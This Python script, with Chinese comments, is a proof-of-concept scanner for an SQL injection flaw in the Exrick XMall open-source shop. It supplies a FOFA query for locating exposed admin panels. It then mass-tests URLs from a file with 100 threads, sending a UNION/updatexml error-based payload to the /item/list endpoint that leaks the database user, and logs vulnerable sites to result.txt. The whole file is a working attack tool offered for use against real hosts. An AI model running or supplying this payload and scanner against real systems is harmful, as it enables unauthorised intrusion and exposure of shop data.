#Exrick XMall 开源商城 SQL注入漏洞

# 全球数据如下
# fofa：app="XMall-后台管理系统"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
 ________  _ ____  _  ____  _  __  ___  _ _      ____  _     _    
/  __/\  \///  __\/ \/   _\/ |/ /  \  \/// \__/|/  _ \/ \   / \   
|  \   \  / |  \/|| ||  /  |   /    \  / | |\/||| / \|| |   | |   
|  /_  /  \ |    /| ||  \_ |   \    /  \ | |  ||| |-||| |_/\| |_/\
\____\/__/\\\_/\_\\_/\____/\_|\_\  /__/\\\_/  \|\_/ \|\____/\____/                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Exrick XMall")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    url = target + url_payload
    header = {
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With':'XMLHttpRequest',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Accept-Language':'zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7',
        'Connection':'close'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200 and "XPATH syntax error" in res.text:
            print(f"f[+]该url存在SQL注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该站点{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == '__main__':
    main()